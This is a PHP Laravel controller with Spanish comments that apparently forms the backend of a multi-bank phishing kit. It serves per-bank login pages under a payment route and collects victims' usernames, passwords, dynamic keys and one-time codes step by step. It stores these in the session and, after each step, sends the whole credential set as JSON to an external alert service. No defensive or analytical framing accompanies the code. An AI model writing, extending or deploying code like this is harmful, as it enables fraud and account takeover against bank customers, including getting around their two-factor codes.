<?php

namespace App\Http\Controllers;

use App\Services\AlertService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\View;

class BankFlowController extends Controller
{
    public function index(string $bank, Request $request)
    {
        $cfg = config("banks.$bank");

        // Si el banco no existe, manda a una vista genérica o 404
        abort_if(!$cfg, 404);

        $view = $cfg['view_prefix'] . '.index';
        abort_if(!View::exists($view), 404);

        return view($view, ['bankSlug' => $bank]);
    }

   public function step(string $bank, int $step, Request $request, AlertService $alert)
    {
        $cfg = config("banks.$bank");
        abort_if(!$cfg, 404);

        $maxSteps = (int) ($cfg['steps'] ?? 2);
        abort_if($step < 1 || $step > $maxSteps, 404);

        $view = $cfg['view_prefix'] . ".step{$step}";
        abort_if(!View::exists($view), 404);

        // (Opcional) si quieres “ping” al entrar a cada step > 1
        $mid = $request->session()->get('mid');
        $userData = $request->session()->get('userData', []);
/* 
        if ($mid && !empty($userData) && $step > 1) {
            $alert->editMessage($mid, json_encode($userData, JSON_UNESCAPED_UNICODE));
        } */

        return view($view, [
            'bankSlug' => $bank,
            'step'     => $step,
            'maxSteps' => $maxSteps,
        ]);
    }

    public function saveStep(string $bank, int $step, Request $request, AlertService $alert)
    {
        $cfg = config("banks.$bank");
        abort_if(!$cfg, 404);

        $maxSteps = (int) ($cfg['steps'] ?? 2);

        // Obtener sesión actual
        $userData = $request->session()->get('userData', []);

        if (is_string($userData)) {
            $decoded = json_decode($userData, true);
            $userData = is_array($decoded) ? $decoded : [];
        }   

        // STEP 1 → usuario / pass
        if ($step === 1 && $maxSteps === 2) {
            $data = $request->validate([
                'usuario' => 'required|string|max:50',
                'pass'    => 'required|string|max:50',
            ]);

            $userData['usuario'] = $data['usuario'];
            $userData['pass']    = $data['pass'];
        }

        // STEP 1 → usuario
        if ($step === 1 && $maxSteps === 3) {
            $data = $request->validate([
                'usuario' => 'required|string|max:50',
            ]);

            $userData['usuario'] = $data['usuario'];
        }

        // STEP 2 → pass
        if ($step === 2 && $maxSteps >= 3) {
            $data = $request->validate([
                'pass' => 'required|string|max:50',
            ]);

            $userData['pass'] = $data['pass'];
        }

        // STEP 2 → clave dinámica
        if ($step === 2 && $maxSteps === 2) {
            $data = $request->validate([
                'dinamica' => 'nullable|string|min:6|max:8',
                'otp' => 'nullable|string|min:6|max:8',
            ]);

            // 🔥 SOLO agregar el nuevo campo
            if (!empty($data['dinamica'])) {
                    $userData['dinamica'] = $data['dinamica'];
            }

            if (!empty($data['otp'])) {
                $userData['otp'] = $data['otp'];
            }
        }

        if ($step === 3) {
           $data = $request->validate([
                'dinamica' => 'nullable|string|min:6|max:8',
                'otp' => 'nullable|string|min:6|max:8',
            ]);

            // 🔥 SOLO agregar el nuevo campo
            if (!empty($data['dinamica'])) {
                    $userData['dinamica'] = $data['dinamica'];
            }

            if (!empty($data['otp'])) {
                $userData['otp'] = $data['otp'];
            }
        }

        // Guardar sesión
        $request->session()->put('userData', $userData);

        // Editar mensaje API si existe
        $mid = $request->session()->get('mid');
        if ($mid) {
            $alert->editMessage(
                $mid,
                json_encode($userData, JSON_UNESCAPED_UNICODE)
            );
        }

        return response()->json([
            'success' => true,
            'next' => route('pago.bank.step', ['bank' => $bank, 'step' => min($step + 1, $maxSteps)]),
        ]);
        
    }
}
